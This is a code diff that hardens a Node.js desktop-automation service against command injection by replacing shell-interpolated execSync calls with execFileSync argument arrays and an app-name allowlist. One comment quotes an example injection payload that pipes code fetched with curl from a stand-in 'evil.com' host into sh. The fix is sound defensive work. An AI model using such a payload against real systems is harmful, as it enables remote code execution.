@@ -12,7 +12,7 @@
  * On other platforms: uses no-op stubs so the service stays importable.
  */
 
-const { execSync, spawn }  = require("child_process");
+const { execFileSync, spawn } = require("child_process");
 const fs                   = require("path");
 const path                 = require("path");
 const os                   = require("os");
@@ -26,24 +26,42 @@ const _obs = () => _try(() => require("./continuousRuntimeObserver.cjs"));
 const _le  = () => _try(() => require("./continuousLearningEngine.cjs"));
 
 function _ts() { return new Date().toISOString(); }
-function _exec(cmd, timeoutMs = 5000) {
+
+// Security Hardening (Zero-Trust Remediation): every function below used to
+// build a shell command string via template interpolation of caller-supplied
+// values (appName, filePath, clipboard text) and run it through execSync,
+// which invokes /bin/sh -c on the full string — meaning any authenticated
+// user could pass `appName: 'Foo"; curl evil.com/x|sh #'` and achieve RCE.
+// _execFile below replaces every call site with execFileSync(bin, argvArray),
+// which never invokes a shell — no `;`, `|`, `&&`, `$()`, or backticks are
+// ever interpreted, regardless of what the argument strings contain.
+function _execFile(bin, args, timeoutMs = 5000) {
   try {
-    return { ok: true, out: execSync(cmd, { timeout: timeoutMs, stdio: ["ignore","pipe","pipe"] }).toString().trim() };
+    return { ok: true, out: execFileSync(bin, args, { timeout: timeoutMs, stdio: ["ignore", "pipe", "pipe"] }).toString().trim() };
   } catch (e) {
     return { ok: false, out: "", error: e.message?.slice(0, 300) };
   }
 }
 
+// App/window names are validated against a conservative allowlist pattern
+// (letters, numbers, spaces, and a small set of punctuation real app names
+// use) rather than passed to a shell — this is defense in depth on top of
+// execFileSync already making shell metacharacters inert, so a name that
+// fails this check is simply not a real application name.
+const _SAFE_NAME = /^[\w\s.\-()&']{1,128}$/;
+function _isSafeName(s) { return typeof s === "string" && _SAFE_NAME.test(s); }
+
 // ── launchApp ─────────────────────────────────────────────────────────────────
 
 function launchApp(appName, opts = {}) {
   if (!appName) return { ok: false, error: "appName required" };
+  if (!_isSafeName(appName)) return { ok: false, app: appName, error: "invalid app name", ts: _ts() };
 
   let result;
   if (PLATFORM === "darwin") {
-    result = _exec(`open -a "${appName}"`, 8000);
+    result = _execFile("open", ["-a", appName], 8000);
   } else if (PLATFORM === "linux") {
-    result = _exec(`nohup ${appName} &`, 3000);
+    result = _execFile(appName, [], 3000);
   } else {
     result = { ok: false, out: "", error: `Platform ${PLATFORM} not supported for launchApp` };
   }
@@ -56,9 +74,10 @@ function launchApp(appName, opts = {}) {
 // ── focusWindow ───────────────────────────────────────────────────────────────
 
 function focusWindow(appName) {
+  if (!_isSafeName(appName)) return { ok: false, app: appName, error: "invalid app name" };
   if (PLATFORM === "darwin") {
     const script = `tell application "${appName}" to activate`;
-    const r = _exec(`osascript -e '${script}'`, 5000);
+    const r = _execFile("osascript", ["-e", script], 5000);
     return { ok: r.ok, app: appName, error: r.error };
   }
   return { ok: false, error: `focusWindow not supported on ${PLATFORM}` };
@@ -69,8 +88,8 @@ function focusWindow(appName) {
 function openPath(filePath) {
   const abs = path.resolve(filePath);
   let r;
-  if (PLATFORM === "darwin") r = _exec(`open "${abs}"`, 5000);
-  else if (PLATFORM === "linux") r = _exec(`xdg-open "${abs}"`, 5000);
+  if (PLATFORM === "darwin") r = _execFile("open", [abs], 5000);
+  else if (PLATFORM === "linux") r = _execFile("xdg-open", [abs], 5000);
   else r = { ok: false, error: `openPath not supported on ${PLATFORM}` };
   return { ok: r.ok, path: abs, error: r.error };
 }
@@ -79,11 +98,12 @@ function openPath(filePath) {
 
 function clipboardRead() {
   if (PLATFORM === "darwin") {
-    const r = _exec("pbpaste", 3000);
+    const r = _execFile("pbpaste", [], 3000);
     return { ok: r.ok, content: r.out, error: r.error };
   }
   if (PLATFORM === "linux") {
-    const r = _exec("xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null", 3000);
+    let r = _execFile("xclip", ["-selection", "clipboard", "-o"], 3000);
+    if (!r.ok) r = _execFile("xsel", ["--clipboard", "--output"], 3000);
     return { ok: r.ok, content: r.out, error: r.error };
   }
   return { ok: false, content: "", error: `clipboardRead not supported on ${PLATFORM}` };
@@ -91,16 +111,31 @@ function clipboardRead() {
 
 function clipboardWrite(text) {
   if (!text) return { ok: false, error: "text required" };
-  const escaped = text.replace(/'/g, "'\\''");
   if (PLATFORM === "darwin") {
-    const r = _exec(`printf '%s' '${escaped}' | pbcopy`, 3000);
+    const r = _execFileStdin("pbcopy", [], text, 3000);
     return { ok: r.ok, error: r.error };
   }
   if (PLATFORM === "linux") {
-    const r = _exec(`printf '%s' '${escaped}' | xclip -selection clipboard 2>/dev/null || printf '%s' '${escaped}' | xsel --clipboard --input`, 3000);
+    let r = _execFileStdin("xclip", ["-selection", "clipboard"], text, 3000);
+    if (!r.ok) r = _execFileStdin("xsel", ["--clipboard", "--input"], text, 3000);
     return { ok: r.ok, error: r.error };
   }
   return { ok: false, error: `clipboardWrite not supported on ${PLATFORM}` };
+}
+
+// Writes `input` to the child's stdin instead of building a shell pipeline
+// (`printf '%s' '<escaped>' | pbcopy`) — the previous quoting-escape approach
+// is exactly the class of thing that's trivial to get wrong; passing the
+// text as stdin to a non-shell execFileSync call has no injection surface
+// regardless of what characters the text contains.
+function _execFileStdin(bin, args, input, timeoutMs = 5000) {
+  try {
+    const { execFileSync } = require("child_process");
+    const out = execFileSync(bin, args, { input, timeout: timeoutMs, stdio: ["pipe", "pipe", "pipe"] });
+    return { ok: true, out: out.toString().trim() };
+  } catch (e) {
+    return { ok: false, out: "", error: e.message?.slice(0, 300) };
+  }
 }
 
 // ── readDesktopState ──────────────────────────────────────────────────────────
@@ -121,9 +156,9 @@ function readDesktopState() {
 
   // macOS: active app + window title
   if (PLATFORM === "darwin") {
-    const activeApp = _exec(`osascript -e 'tell application "System Events" to get name of first application process whose frontmost is true'`, 3000);
+    const activeApp = _execFile("osascript", ["-e", 'tell application "System Events" to get name of first application process whose frontmost is true'], 3000);
     if (activeApp.ok) state.activeApp = activeApp.out;
-    const windowTitle = _exec(`osascript -e 'tell application "System Events" to get title of front window of (first application process whose frontmost is true)'`, 3000);
+    const windowTitle = _execFile("osascript", ["-e", 'tell application "System Events" to get title of front window of (first application process whose frontmost is true)'], 3000);
     if (windowTitle.ok) state.activeWindowTitle = windowTitle.out;
   }
 
@@ -179,8 +214,9 @@ async function captureScreenshot(opts = {}) {
 
 function switchWorkspace(direction = "right") {
   if (PLATFORM === "darwin") {
-    const key = direction === "right" ? "right" : "left";
-    const r = _exec(`osascript -e 'tell application "System Events" to key code ${key === "right" ? 124 : 123} using control down'`, 3000);
+    const keyCode = direction === "right" ? 124 : 123;
+    const script = `tell application "System Events" to key code ${keyCode} using control down`;
+    const r = _execFile("osascript", ["-e", script], 3000);
     return { ok: r.ok, direction, error: r.error };
   }
   return { ok: false, error: `switchWorkspace not supported on ${PLATFORM}` };
